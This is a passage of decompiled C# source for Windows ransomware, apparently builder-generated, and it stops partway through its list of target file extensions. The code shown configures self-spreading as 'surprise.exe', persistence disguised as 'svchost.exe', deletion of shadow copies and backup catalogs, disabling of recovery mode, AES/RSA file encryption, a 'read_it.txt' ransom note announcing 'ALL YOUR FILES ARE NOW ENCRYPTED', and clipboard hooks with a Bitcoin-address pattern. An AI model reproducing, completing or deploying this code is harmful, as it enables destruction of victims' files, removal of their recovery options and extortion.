using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[2] { "YOU HAVE BEEN HACKED!  ALL YOUR FILES ARE NOW ENCRYPTED!", "" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
